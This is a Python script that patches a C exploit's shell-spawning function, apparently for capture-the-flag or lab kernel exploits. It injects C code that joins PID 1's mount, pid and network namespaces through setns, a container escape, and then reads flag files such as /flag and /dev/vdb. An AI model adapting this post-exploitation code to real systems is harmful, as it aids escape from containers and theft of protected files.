#!/usr/bin/env python3
"""Patch shell-spawning functions (getroot/pwn/etc.) to read the flag instead."""
import re
import sys

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <exploit.c>")
    sys.exit(1)

path = sys.argv[1]
with open(path, 'r') as f:
    lines = f.readlines()

FLAG_BODY = '''\tchar buf[256];
\tint fd, n;
\tsetns(open("/proc/1/ns/mnt", 0), 0);
\tsetns(open("/proc/1/ns/pid", 0), 0);
\tsetns(open("/proc/1/ns/net", 0), 0);
\tfd = open("/tmp/flag", 0);
\tif (fd < 0) fd = open("/flag", 0);
\tif (fd < 0) fd = open("/dev/vdb", 0);
\tif (fd >= 0) {
\t\tn = read(fd, buf, sizeof(buf) - 1);
\t\tif (n > 0) { buf[n] = 0; printf("%s\\n", buf); }
\t\tclose(fd);
\t}
\tprintf("uid=%d\\n", getuid());
\texit(0);
'''

# Find the line with execve("/bin/sh") or execve("/bin/bash")
# Also handles split patterns where /bin/sh is in a variable on a prior line
execve_line = None
for i, line in enumerate(lines):
    if re.search(r'execve\s*\(.*?/bin/(ba)?sh', line):
        execve_line = i
        break

# If not found inline, look for execve near a /bin/sh string (within 5 lines)
if execve_line is None:
    shell_lines = [i for i, line in enumerate(lines) if re.search(r'/bin/(ba)?sh', line)]
    for sl in shell_lines:
        for j in range(max(0, sl - 5), min(len(lines), sl + 6)):
            if re.search(r'execve\s*\(', lines[j]):
                execve_line = j
                break
        if execve_line is not None:
            break

if execve_line is None:
    # Also match system("cat /flag") or system("/bin/sh") patterns
    for i, line in enumerate(lines):
        if re.search(r'system\s*\(.*?(/bin/(ba)?sh|cat\s+/flag)', line):
            execve_line = i
            break

if execve_line is None:
    print('No execve /bin/sh found')
    sys.exit(0)

# Find the enclosing function: scan backwards for 'type funcname(...) {'
# Supports: void, static void, int, static int, etc.
func_start = None
func_name = None
for i in range(execve_line, -1, -1):
    m = re.match(r'(?:static\s+)?(?:void|int|long|unsigned)\s+(\w+)\s*\([^)]*\)\s*\{', lines[i])
    if m:
        # Don't replace main()
        if m.group(1) == 'main':
            break
        func_start = i
        func_name = m.group(1)
        break

# Find the closing brace: scan forward for a line that is just '}'
func_end = None
for i in range(execve_line, len(lines)):
    if lines[i].strip() == '}' and not lines[i].startswith('\t\t'):
        func_end = i
        break

if func_start is not None and func_end is not None:
    new_lines = lines[:func_start + 1] + [FLAG_BODY] + [lines[func_end]]
    new_lines += lines[func_end + 1:]
    with open(path, 'w') as f:
        f.writelines(new_lines)
    print(f'Patched {func_name}()')
else:
    # Fallback: inline replacement of system("cat /flag...") and execlp/execve shell calls
    # This handles cases where the call is inside main() or a non-void function
    patched = False
    new_lines = []
    flag_read_inline = (
        '{ char _buf[256]; int _fd, _n; '
        '_fd = open("/tmp/flag", 0); '
        'if (_fd < 0) _fd = open("/flag", 0); '
        'if (_fd < 0) _fd = open("/dev/vdb", 0); '
        'if (_fd >= 0) { _n = read(_fd, _buf, 255); '
        'if (_n > 0) { _buf[_n] = 0; printf("%s\\n", _buf); } '
        'close(_fd); } exit(0); }\n'
    )
    for line in lines:
        if not patched and re.search(r'system\s*\(.*?cat\s+/flag', line):
            indent = re.match(r'(\s*)', line).group(1)
            new_lines.append(f'{indent}{flag_read_inline}')
            patched = True
        elif not patched and re.search(r'execlp\s*\(\s*"(ba)?sh"', line):
            indent = re.match(r'(\s*)', line).group(1)
            new_lines.append(f'{indent}{flag_read_inline}')
            patched = True
        else:
            new_lines.append(line)
    if patched:
        with open(path, 'w') as f:
            f.writelines(new_lines)
        print('Patched inline system()/execlp() call')
    else:
        print('Could not find enclosing function boundaries')
